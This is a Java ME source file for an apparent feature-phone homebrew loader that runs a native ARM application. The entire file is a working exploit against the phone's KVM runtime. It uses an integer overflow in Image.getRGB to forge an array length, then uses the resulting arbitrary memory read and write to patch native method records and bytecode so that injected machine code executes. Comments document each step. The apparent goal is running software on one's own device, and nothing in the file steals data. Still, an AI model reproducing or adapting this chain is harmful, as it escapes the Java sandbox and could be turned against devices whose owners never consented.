/* SPDX-License-Identifier: MIT */
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import javax.microedition.lcdui.Image;

/**
 * Concrete owner of the bootstrap methods and native session. Keep this class
 * final: discovery inspects this object's own KVM method table, so moving its
 * native methods into a superclass would break the checked ownership relation.
 * The UI and application configuration stay outside the forged-heap interval.
 */
final class NativeSession {
    /** Optional UI observer. Never invoked while the Java heap view is forged. */
    interface Progress {
        void checkpoint(int code, int percent);
    }

    private static final int FORGED_LENGTH = 0x40000000;
    private int cacheSync;
    private static final int NATIVE_MAGIC = 0x444F4F4D; // "DOOM"

    final int[] result;
    private final String resource;
    private final Progress progress;
    private int transferTotal, transferred, reportedPercent;
    int error;
    Throwable failure;
    boolean applicationStarted;
    // C3 carrier jump offsets temporarily hold three native literals.
    private static final int CARRIER_BYTES = 114;
    private static final int CARRIER_ENTRY = 12;
    private static final int CARRIER_PAYLOAD = 40;
    private static final int CARRIER_LENGTH = 48;
    private static final int CARRIER_CACHE = 56;
    private static final int[] CARRIER_WORDS = {0xE0194280, 0xE01D4790, 0xE0154798, 0xE0094800,
            0xE0014900, 0xE7ED4A00, 0xE7F51C04, 0xE7EDB510, 0x0000BD10, 0xE7E11C23};
    private int carrierCode, savedPayload, savedLength, savedCache;
    private boolean carrierPatched;
    private byte[] stageBytes;
    private byte[] nativeBytes;
    final FirmwareResolver resolver;
    final FirmwareProfile profile;
    private boolean scanOnly;
    private int launchOptions;
    // Timing is sampled outside the no-allocation firmware-access interval.
    long discoveryMs;
    private long discoveryStarted;

    /* result[] is the loader command/return descriptor (bootstrap/loader.c).
     * [0] magic [1] command [2] allocated image [3] status
     * [4..10] native diagnostics [11..14] loading bounds/entry
     * [15] binding count [16..79] error text [80] method slot to restore
     * [94] application launch options [96..1119] 4KiB transfer
     * [1120..] resolved firmware API.
     * No transfer calls occur once the application starts.
     */

    /* Temporary bootstrap objects. No UI objects are allocated while forged. */
    private int[] payload;
    private int[] canary;
    private Object[] pointerBox;
    private int[] target;
    private int[] destination;
    private boolean forged;
    private int viewBase;
    private int cacheMethod;
    private int queryMethod;
    private int cacheFlags;
    private int canaryOriginal;
    private boolean canaryDirty;
    private boolean cachePatched, queryPatched;

    /*
     * Zero arguments: the ROM cache helper does not perform KNI cleanup.
     * Calling that helper through a method with arguments would leave the
     * native operand stack unbalanced, so cacheMarker is deliberately separate.
     */
    private static native void cacheMarker();

    /*
     * One argument: the ARM payload calls KNI_GetParameterAsObject(1, ...).
     * Static native parameters start at index 1; index 0 is reserved for the
     * receiver of an instance native method. loader.S finishes with the
     * firmware's KNI_ReturnVoid routine to discard this argument correctly.
     */
    private static native void nativeQuery(int[] output);

    NativeSession(FirmwareProfile profile, String resource) {
        this(profile, resource, null);
    }

    NativeSession(FirmwareProfile profile, String resource, Progress progress) {
        this.profile = profile;
        this.resource = resource;
        this.progress = progress;
        result = new int[FirmwareApi.DESCRIPTOR + FirmwareApi.COUNT];
        resolver = new FirmwareResolver(profile);
    }

    /** Synchronous call on the launcher's worker thread. No UI during forging. */
    void execute(boolean checkOnly) {
        execute(checkOnly, 0);
    }

    void execute(boolean checkOnly, int options) {
        scanOnly = checkOnly;
        launchOptions = options;
        applicationStarted = false;
        int error = 0;
        Throwable thrown = null;
        discoveryStarted = System.currentTimeMillis();
        discoveryMs = -1;
        try {
            checkpoint(0x10, -1);
            discoveryStarted = System.currentTimeMillis();
            error = runChain();
            if (error == 0 && !scanOnly) {
                // Restore the forged array BEFORE any streaming or allocation.
                // The loader clears its own method binding on final run/free.
                target[0x3FFFFFFF] = 1;
                forged = false;
                discoveryMs = System.currentTimeMillis() - discoveryStarted;
                checkpoint(0x20, -1);
                loadApplication();
                if (result[3] != 0)
                    error = result[3];
            }
        } catch (Throwable t) {
            thrown = t;
        } finally {
            try {
                if (queryMethod != 0 && result[84] != 0) {
                    result[1] = 4;
                    nativeQuery(result);
                    queryMethod = 0;
                }
                restoreKvmState();
            } catch (Throwable t) {
                if (thrown == null)
                    thrown = t;
                error = 90;
            }
            if (discoveryMs < 0)
                discoveryMs = System.currentTimeMillis() - discoveryStarted;
        }
        this.error = error;
        this.failure = thrown;
    }

    private void checkpoint(int code, int percent) {
        // Keep this guard even though all call sites are outside runChain().
        // A future misplaced diagnostic must never invoke allocating UI code
        // with target.length forged. Do not throw/allocate in that case either.
        if (progress != null && !forged)
            progress.checkpoint(code, percent);
    }

    private void reportLoading(int bytes) {
        if (progress == null)
            return;
        transferred += bytes;
        int percent = (int) ((long) transferred * 100 / transferTotal);
        int bucket = percent / 10 * 10;
        if (bucket > reportedPercent) {
            reportedPercent = bucket;
            checkpoint(0x22, bucket);
        }
    }

    private static int resourceWord(InputStream in) throws IOException {
        int a = in.read(), b = in.read(), c = in.read(), d = in.read();
        if ((a | b | c | d) < 0)
            throw new IOException("Truncated native header");
        return a | (b << 8) | (c << 16) | (d << 24);
    }
    private void loaderCall(int op) throws IOException {
        result[1] = op;
        nativeQuery(result);
        if (result[0] != NATIVE_MAGIC || result[3] != 0)
            throw new IOException("Loader check " + result[3]);
    }
    private void transfer(InputStream in, byte[] buf, int offset, int size) throws IOException {
        while (size > 0) {
            int n = size > buf.length ? buf.length : size;
            int pos = 0;
            while (pos < n) {
                int r = in.read(buf, pos, n - pos);
                if (r < 0)
                    throw new IOException("Truncated native image");
                if (r == 0) {
                    int c = in.read();
                    if (c < 0)
                        throw new IOException("Native EOF");
                    buf[pos++] = (byte) c;
                } else
                    pos += r;
            }
            for (int i = n; i < ((n + 3) & ~3); i++)
                buf[i] = 0;
            for (int i = 0; i < n; i += 4)
                result[96 + (i >> 2)] = readWordLE(buf, i);
            result[12] = offset;
            result[13] = n;
            loaderCall(2);
            reportLoading(n);
            offset += n;
            size -= n;
        }
    }
    private void loadApplication() throws IOException {
        InputStream in = resource.endsWith(".parts")
                ? new ChunkedResourceInputStream(NativeSession.class, resource)
                : NativeSession.class.getResourceAsStream(resource);
        if (in == null)
            throw new IOException("Missing native application");
        int memory, entry, relocations, stack, bindings;
        try {
            if (resourceWord(in) != 0x30443453 || resourceWord(in) != 2)
                throw new IOException("Bad native image version");
            int bytes = resourceWord(in);
            memory = resourceWord(in);
            entry = resourceWord(in);
            relocations = resourceWord(in);
            stack = resourceWord(in);
            bindings = resourceWord(in);
            int allocation = NativeImageBounds.allocationBytes(
                    bytes, memory, entry, relocations, stack, bindings);
            if (allocation == 0)
                throw new IOException("Bad native image bounds");
            byte[] buf = new byte[4096];
            result[11] = allocation;
            checkpoint(0x21, -1);
            loaderCall(1);
            transferTotal = bytes + 4 * relocations + 8 * bindings;
            transferred = 0;
            reportedPercent = 0;
            checkpoint(0x22, 0);
            transfer(in, buf, 0, bytes);
            transfer(in, buf, memory, 4 * relocations);
            transfer(in, buf, memory + 4 * relocations, 8 * bindings);
            if (in.read() != -1)
                throw new IOException("Trailing native image bytes");
        } finally {
            in.close();
        }
        result[12] = memory;
        result[13] = relocations;
        result[14] = entry;
        result[15] = bindings;
        result[FirmwareApi.LAUNCH_OPTIONS_WORD] = launchOptions;
        result[1] = 3;
        checkpoint(0x23, -1);
        // Native entry restores this method slot before running the application.
        // After it returns there is no callable native binding left.
        queryMethod = 0;
        queryPatched = false;
        applicationStarted = true;
        nativeQuery(result);
    }

    /**
     * Returns a numeric error instead of allocating exception objects after
     * target.length has been forged. All text is formatted after restoration.
     */
    private int runChain() throws IOException {
        if (stageBytes == null) {
            /* Resource I/O allocates buffers, so it belongs before System.gc()
             * and well before the five-array layout used by the bootstrap. */
            stageBytes = readResource("/stage.bin");
            nativeBytes = readResource("/native.bin");
        }
        if (stageBytes == null || nativeBytes == null) {
            return 1;
        }
        if ((stageBytes.length & 3) != 0 || stageBytes.length > 56 || (nativeBytes.length & 3) != 0
                || nativeBytes.length == 0 || nativeBytes.length > 3072) {
            return 2;
        }

        result[0] = 0;
        result[1] = 0;
        result[2] = 0;
        for (int i = 3; i < result.length; i++) {
            result[i] = 0;
        }
        // Materialize/check the carrier method while Java allocation is safe.
        if (carrierSwitch(0) != 1)
            return 120;
        int[] rgb = {FORGED_LENGTH};
        Image source = Image.createRGBImage(rgb, 1, 1, true);
        int[] measured = new int[1];
        source.getRGB(measured, 0, 1, 0, 0, 1, 1);
        /* The eventual corrupting write is a pixel copy, not a raw integer
         * store. Measure the device's ARGB conversion first: if this value is
         * not preserved exactly, it cannot safely become the forged length. */
        if (measured[0] != FORGED_LENGTH) {
            return 3;
        }

        /* Release the previous invocation's complete object group before GC. */
        payload = null;
        canary = null;
        pointerBox = null;
        target = null;
        destination = null;
        cacheMethod = 0;
        queryMethod = 0;
        cachePatched = queryPatched = carrierPatched = false;
        carrierCode = 0;
        canaryDirty = false;
        forged = false;
        System.gc();

        /*
         * Exact KVM high-end allocation order. There must be no object
         * allocation between these five statements.
         *
         *   destination[11]       = target.length
         *   target[5..8]          = pointerBox[0..3]
         *   target[13..14]        = canary[0..1]
         */
        payload = new int[1024];
        canary = new int[2];
        pointerBox = new Object[4];
        target = new int[1];
        destination = new int[8];
        canary[0] = 0x13579BDF;
        canary[1] = 0x2468ACE0;
        pointerBox[0] = payload;
        pointerBox[1] = this;
        pointerBox[2] = target;
        pointerBox[3] = canary;

        if (target.length != 1) {
            return 4;
        }
        overflowedOnePixelWrite(source, destination, 11);
        if (target.length != FORGED_LENGTH) {
            return 5;
        }
        forged = true;
        /* From this point until restoreKvmState, target is an address-translation
         * window, not an ordinary one-element array. readWord/writeWord use
         * 32-bit index scaling to reach any aligned KVM address. */
        if (target[13] != 0x13579BDF || target[14] != 0x2468ACE0 || canary[0] != 0x13579BDF
                || canary[1] != 0x2468ACE0) {
            return 6;
        }

        /* Prove reversible cross-object access before touching method metadata. */
        canaryOriginal = canary[0];
        canaryDirty = true;
        target[13] = canaryOriginal + 1;
        if (canary[0] != canaryOriginal + 1) {
            return 7;
        }
        target[13] = canaryOriginal;
        canaryDirty = false;
        if (canary[0] != canaryOriginal) {
            return 8;
        }

        int payloadObject = target[5];
        int sessionObject = target[6];
        int targetObject = target[7];
        int canaryObject = target[8];
        if (payloadObject == 0 || sessionObject == 0 || targetObject == 0 || canaryObject == 0
                || ((payloadObject | sessionObject | targetObject | canaryObject) & 3) != 0) {
            return 9;
        }
        if (!ramRange(payloadObject, 12 + 4 * payload.length) || !ramRange(sessionObject, 4)
                || !ramRange(targetObject, 16) || !ramRange(canaryObject, 20))
            return 9;
        viewBase = targetObject + 12;

        // This scanner allocates nothing and calls no native service. All
        // firmware bindings are discovered while the arbitrary read view exists.
        if (!resolver.resolve(target, viewBase))
            return resolver.error;
        cacheSync = resolver.api[FirmwareApi.CACHE_SYNC];
        // Native configuration occupies reserved descriptor words before the
        // transfer buffer (96). The same ARM payload serves both displays.
        result[FirmwareApi.UI_REFRESH_WORD] = resolver.uiRefresh;
        result[FirmwareApi.DISPLAY_WIDTH_WORD] = profile.displayWidth;
        result[FirmwareApi.DISPLAY_HEIGHT_WORD] = profile.displayHeight;
        result[FirmwareApi.TIMER_MESSAGE_LAST_WORD] = profile.timerMessageLast;
        result[FirmwareApi.IGNORED_TIMER_WORD] = profile.ignoredTimer;
        result[FirmwareApi.SPECIAL_TIMER_WORD] = profile.specialTimer;
        result[FirmwareApi.SPECIAL_TIMER_HANDLER_WORD] = resolver.specialTimerHandler;
        result[FirmwareApi.INPUT_LAYOUT_WORD] = profile.inputLayout;
        result[FirmwareApi.CANVAS_LAYOUT_WORD] = profile.canvasLayout;
        for (int i = 0; i < FirmwareApi.COUNT; i++)
            result[FirmwareApi.DESCRIPTOR + i] = resolver.api[i];

        /*
         * Recover metadata from live pointers rather than hardcoded heap
         * addresses. On this KVM an instance's class pointer is at object+0,
         * the writable method-table pointer is at class+36, the table starts
         * with a count, and each following method record is 32 bytes.
         */
        int classObject = readWord(sessionObject);
        if (!ramRange(classObject, 40)) {
            return 10;
        }
        int methodTable = readWord(classObject + 36);
        if (!ramRange(methodTable, 4)) {
            return 10;
        }
        int methodCount = readWord(methodTable);
        if (methodCount < 1 || methodCount > 512 || !ramRange(methodTable, 4 + 32 * methodCount)) {
            return 10;
        }
        cacheMethod = findNativeMethod(methodTable, methodCount, classObject, 0);
        queryMethod = findNativeMethod(methodTable, methodCount, classObject, 1);
        if (cacheMethod == 0 || queryMethod == 0 || cacheMethod == queryMethod) {
            return 11;
        }
        cacheFlags = readWord(cacheMethod + 20);
        int queryFlags = readWord(queryMethod + 20);
        /* Preserve the raw record words before changing anything. These values
         * distinguish a flag-layout assumption from an already-bound code slot. */
        result[7] = cacheFlags;
        result[8] = queryFlags;
        result[9] = readWord(cacheMethod + 4);
        result[10] = readWord(queryMethod + 4);
        result[11] = readWord(cacheMethod + 28);
        result[12] = readWord(queryMethod + 28);
        result[13] = (cacheMethod - methodTable - 4) / 32;
        result[14] = (queryMethod - methodTable - 4) / 32;
        result[15] = methodCount;
        /* KVM adds ACC_POINTER|ACC_DOUBLE (0xC000) to void methods as internal
         * return-type metadata. Thus both private static native void records
         * have runtime flags 0xC10A, not just the class-file bits 0x10A. Keep
         * the original full words for restoration, including these extra bits. */
        if ((cacheFlags & 0xFFFF) != 0xC10A || (queryFlags & 0xFFFF) != 0xC10A || result[9] != 0
                || result[10] != 0) {
            return 12;
        }

        if (FirmwareProfiles.CARRIER_BOOTSTRAP.equals(profile.bootstrapId))
            return installThroughCarrier(methodTable, methodCount, classObject, payloadObject + 12);

        /* Select an address that is also safe when read as KVM method flags. */
        int payloadData = payloadObject + 12;
        int stageIndex = findStageIndex(
                payloadData, payload.length, cacheMethod, stageBytes.length, nativeBytes.length);
        if (stageIndex < 0) {
            return 13;
        }
        int stageAddress = payloadData + (stageIndex << 2);
        int nativeIndex = stageIndex + 16;
        if ((nativeIndex << 2) + nativeBytes.length > (payload.length << 2)) {
            return 14;
        }
        int nativeAddress = payloadData + (nativeIndex << 2);
        if (!copyAndBindLoader(nativeBytes, payload, nativeIndex))
            return 119;
        /* stage.bin is position independent except for three literal slots.
         * Patch those slots with this invocation's live payload address, exact
         * byte length, and firmware cache helper before synchronizing it. */
        if (!copyAndPatchStage(
                    stageBytes, payload, stageIndex, nativeAddress, nativeBytes.length)) {
            return 15;
        }
        if (scanOnly)
            return 0;

        /*
         * At the native BLX, r0=accessFlags and r1=methodRecord. Supplying the
         * stage address as flags gives the cache helper r0=A and a wrapped end
         * A+methodRecord. Its first two 32-byte lines cover this entire stage.
         * cacheMarker has no Java arguments, so direct ROM return needs no KNI
         * argument cleanup.
         */
        cachePatched = true;
        writeWord(cacheMethod + 20, stageAddress);
        writeWord(cacheMethod + 4, cacheSync);
        cacheMarker();
        writeWord(cacheMethod + 4, 0);
        writeWord(cacheMethod + 20, cacheFlags);
        cachePatched = false;
        cacheMethod = 0;

        /* The stage now synchronizes the full ARM payload and enters it.
         * stageAddress is intentionally even: BLX would interpret bit zero set
         * as a Thumb entry. The native method's own access flags stay intact,
         * so nativeQuery still receives result[] through the normal KNI frame. */
        queryPatched = true;
        writeWord(queryMethod + 4, stageAddress);
        result[80] = queryMethod + 4;
        result[82] = nativeAddress;
        result[83] = nativeBytes.length;
        nativeQuery(result);
        // Keep the loader bound while loadApplication streams the image.
        if (result[0] != NATIVE_MAGIC) {
            return 16;
        }
        if (result[3] != 0 || result[84] == 0)
            return 18;
        return 0;
    }

    /** Use KVM-synchronized bytecode as a small Thumb cache trampoline. */
    private int installThroughCarrier(int table, int count, int owner, int payloadData) {
        int method = findCarrierMethod(table, count, owner);
        if (method == 0)
            return 120;
        carrierCode = readWord(method + 4);
        if (!copyAndBindLoader(nativeBytes, payload, 0))
            return 119;
        if (scanOnly)
            return 0;
        savedPayload = readWord(carrierCode + CARRIER_PAYLOAD);
        savedLength = readWord(carrierCode + CARRIER_LENGTH);
        savedCache = readWord(carrierCode + CARRIER_CACHE);
        carrierPatched = true;
        writeWord(carrierCode + CARRIER_PAYLOAD, payloadData);
        writeWord(carrierCode + CARRIER_LENGTH, nativeBytes.length);
        writeWord(carrierCode + CARRIER_CACHE, cacheSync);
        if (readWord(carrierCode + CARRIER_PAYLOAD) != payloadData
                || readWord(carrierCode + CARRIER_LENGTH) != nativeBytes.length
                || readWord(carrierCode + CARRIER_CACHE) != cacheSync)
            return 121;
        queryPatched = true;
        writeWord(queryMethod + 4, (carrierCode + CARRIER_ENTRY) | 1);
        result[80] = queryMethod + 4;
        result[82] = payloadData;
        result[83] = nativeBytes.length;
        nativeQuery(result);
        // The loader has replaced the temporary carrier binding with its own
        // OS-heap copy. Restore all Java jump offsets before any allocation.
        restoreCarrier();
        if (result[0] != NATIVE_MAGIC)
            return 16;
        if (result[3] != 0 || result[84] == 0)
            return 18;
        return 0;
    }

    private void restoreCarrier() {
        if (!carrierPatched)
            return;
        writeWord(carrierCode + CARRIER_PAYLOAD, savedPayload);
        writeWord(carrierCode + CARRIER_LENGTH, savedLength);
        writeWord(carrierCode + CARRIER_CACHE, savedCache);
        carrierPatched = false;
    }

    private int findCarrierMethod(int table, int count, int owner) {
        int found = 0;
        for (int i = 0; i < count; i++) {
            int method = table + 4 + i * 32;
            int code = readWord(method + 4);
            if (readWord(method + 24) == owner && (readWord(method + 28) >>> 16) == 1
                    && (readWord(method + 20) & 0x108) == 8
                    && (readWord(method + 16) & 65535) == CARRIER_BYTES
                    && ramRange(code, CARRIER_BYTES + 2) && verifyCarrier(code)) {
                if (found != 0)
                    return 0;
                found = method;
            }
        }
        return found;
    }

    private boolean verifyCarrier(int code) {
        // iload_0; lookupswitch, default=111, npairs=10 (JVM big-endian).
        if (readWord(code) != 0x0000AB1A || readWord(code + 4) != 0x6F000000
                || readWord(code + 8) != 0x0A000000)
            return false;
        for (int i = 0; i < CARRIER_WORDS.length; i++) {
            if (readWord(code + 12 + i * 8) != CARRIER_WORDS[i]
                    || readWord(code + 16 + i * 8) != ((91 + i * 2) << 24))
                return false;
        }
        // KVM quickens executed ireturn bytes to D5/D6 (monitor/plain).
        // carrierSwitch(0) above executes the default return before discovery.
        // Keep validating every byte, accepting only those known return forms.
        for (int i = 92; i < 114; i += 2) {
            int pair = (readWord((code + i) & ~3) >>> (((code + i) & 2) * 8)) & 65535;
            int opcode = pair >>> 8;
            if ((pair & 255) != (i == 112 ? 4 : 3)
                    || (opcode != 0xAC && opcode != 0xD5 && opcode != 0xD6))
                return false;
        }
        return true;
    }

    /**
     * Hand-maintained Java, compiled and preverified normally. Each case match
     * encodes a Thumb instruction plus branch. Native execution skips the JVM
     * branch-offset words, using three of them as temporary literal data.
     * The verifier checks the complete compiled body and executes the Thumb
     * path in Unicorn; the handset checks the body again before patching it.
     */
    private static int carrierSwitch(int value) {
        switch (value) {
            case -2143151648:
                return 0;
            case -1874387488:
                return 0;
            case -1740171808:
                return 0;
            case 4721120:
                return 0;
            case 4784608:
                return 0;
            case 4910567:
                return 0;
            case 69006823:
                return 0;
            case 280358375:
                return 0;
            case 280821760:
                return 0;
            case 589095399:
                return 0;
            default:
                return 1;
        }
    }

    /**
     * Undo in dependency order while the forged view is still available:
     * native code pointers/flags first, canary second, array length last.
     * Setting target.length to one removes the ability to repair anything else,
     * so no later statement may depend on out-of-bounds target accesses.
     */
    private void restoreKvmState() {
        if (!forged) {
            return;
        }
        if (cachePatched && cacheMethod != 0) {
            writeWord(cacheMethod + 4, 0);
            writeWord(cacheMethod + 20, cacheFlags);
            cacheMethod = 0;
            cachePatched = false;
        }
        if (queryPatched && queryMethod != 0) {
            writeWord(queryMethod + 4, 0);
            queryMethod = 0;
            queryPatched = false;
        }
        restoreCarrier();
        if (canaryDirty) {
            target[13] = canaryOriginal;
            canaryDirty = false;
        }
        /* index scaling wraps to target+8, the original length field */
        target[0x3FFFFFFF] = 1;
        forged = false;
    }

    /**
     * Locates an unresolved native method by structural properties, not by its
     * position in the compiler-generated method table. The relevant record
     * fields are code+4, accessFlags+20, owner+24, and argumentCount+30.
     * Since +30 is the upper half of the word at +28, the argument count is
     * extracted with an unsigned 16-bit shift. Ambiguity returns zero: choosing
     * an arbitrary matching record could redirect an unrelated native method.
     */
    private int findNativeMethod(int table, int count, int owner, int wantedArgs) {
        int found = 0;
        for (int i = 0; i < count; i++) {
            int method = table + 4 + i * 32;
            int flags = readWord(method + 20);
            int args = readWord(method + 28) >>> 16;
            if (readWord(method + 24) == owner && readWord(method + 4) == 0
                    && (flags & 0x108) == 0x108 && args == wantedArgs) {
                if (found != 0) {
                    return 0; // ambiguous: do not guess
                }
                found = method;
            }
        }
        return found;
    }

    /*
     * target[0] is at viewBase=targetObject+12. KVM computes an element address
     * as viewBase+(index<<2) modulo 2^32. Subtracting viewBase and shifting
     * right unsigned therefore maps every aligned 32-bit address to a positive
     * index in 0..0x3fffffff, all accepted by the forged length 0x40000000.
     * This also handles addresses numerically below targetObject via wraparound.
     */
    private int readWord(int address) {
        int index = (address - viewBase) >>> 2;
        return target[index];
    }

    private boolean ramRange(int address, int bytes) {
        int offset = address - profile.ramStart;
        return (address & 3) == 0 && offset >= 0 && bytes > 0
                && offset <= profile.ramLimit - profile.ramStart - bytes;
    }

    private void writeWord(int address, int value) {
        int index = (address - viewBase) >>> 2;
        target[index] = value;
    }

    /* Java has no unsigned int comparison. Flipping the sign bit maps unsigned
     * order onto signed order without using long or allocating boxed values. */
    private static boolean unsignedLess(int a, int b) {
        return (a ^ 0x80000000) < (b ^ 0x80000000);
    }

    /**
     * The stage address doubles as cacheMarker's accessFlags. Require
     * ACC_NATIVE|ACC_STATIC, but reject ACC_ABSTRACT (0x400): RM-443's first
     * invokestatic path tests it at F0DDA8CC BEFORE its native dispatch at
     * F0DDA940. Ignoring that bit causes AbstractMethodError: cacheMarker for
     * some heap layouts, even with a valid code pointer. Do not just mask the
     * flags after choosing an address: r0 must still point at the actual stage.
     *
     * The cache helper needs a wrapped end (A+methodRecord < A unsigned).
     * Its two 32-byte cache lines must cover the whole stage. Reserve 64 bytes
     * before the loader, and ensure both fit in the payload array. This helper
     * must remain allocation-free while target.length is forged.
     */
    private static int findStageIndex(int payloadData, int payloadWords, int methodAddress,
            int stageLength, int nativeLength) {
        for (int i = 0; ((i + 16) << 2) + nativeLength <= (payloadWords << 2); i++) {
            int address = payloadData + (i << 2);
            if ((address & 0x108) == 0x108 && (address & 0x400) == 0
                    && unsignedLess(address + methodAddress, address)
                    && stageLength <= 64 - (address & 31))
                return i;
        }
        return -1;
    }

    /**
     * Turns the public one-pixel copy into destination[d].
     *
     * <p>Java's signed additions overflow: x+width and offset+width become
     * negative and pass the upper-bound checks. The native wrapper narrows x,
     * width, and scanlength to 0, 1, and 1, but retains the 32-bit offset in
     * object+12+(offset<<2). Since (0x40000000+d)<<2 wraps to d*4, the native
     * destination is exactly destination[d].</p>
     */
    private static void overflowedOnePixelWrite(Image image, int[] output, int d) {
        image.getRGB(output, 0x40000000 + d, 0x40000001, 0x40000000, 0, 0x40000001, 1);
    }

    /* ARM instructions and literals are embedded little-endian. The final byte
     * is signed deliberately: shifting it by 24 preserves bit 31, while the
     * lower three bytes are masked to avoid unwanted sign extension. */
    private static int readWordLE(byte[] bytes, int offset) {
        return (bytes[offset] & 255) | ((bytes[offset + 1] & 255) << 8)
                | ((bytes[offset + 2] & 255) << 16) | (bytes[offset + 3] << 24);
    }

    private boolean copyAndBindLoader(byte[] bytes, int[] words, int wordIndex) {
        int patched = 0;
        for (int i = 0; i < bytes.length; i += 4) {
            int word = readWordLE(bytes, i);
            if ((word & 0xFFFF0000) == FirmwareApi.PATCH_MAGIC) {
                int id = word & 65535;
                if (id >= FirmwareApi.COUNT || resolver.api[id] == 0)
                    return false;
                word = resolver.api[id];
                ++patched;
            }
            words[wordIndex + (i >> 2)] = word;
        }
        return patched == 5;
    }

    /**
     * Copies and relocates the tiny first stage without allocating another
     * array. Each placeholder sets a different bit; all three must be seen.
     * verify.py independently requires exactly one of each in stage.bin, so a
     * duplicate cannot silently satisfy this mask in the distributed resource.
     */
    private boolean copyAndPatchStage(
            byte[] bytes, int[] words, int wordIndex, int nativeAddress, int nativeLength) {
        int patches = 0;
        for (int i = 0; i < bytes.length; i += 4) {
            int word = readWordLE(bytes, i);
            if (word == 0xDEAD0001) {
                word = nativeAddress;
                patches |= 1;
            } else if (word == 0xDEAD0002) {
                word = nativeLength;
                patches |= 2;
            } else if (word == 0xDEAD0003) {
                word = cacheSync;
                patches |= 4;
            }
            words[wordIndex + (i >> 2)] = word;
        }
        return patches == 7;
    }

    private static byte[] readResource(String name) throws IOException {
        InputStream input = NativeSession.class.getResourceAsStream(name);
        if (input == null) {
            return null;
        }
        try {
            ByteArrayOutputStream output = new ByteArrayOutputStream();
            byte[] buffer = new byte[256];
            int count;
            while ((count = input.read(buffer)) >= 0) {
                if (count != 0) {
                    output.write(buffer, 0, count);
                }
            }
            return output.toByteArray();
        } finally {
            input.close();
        }
    }
}
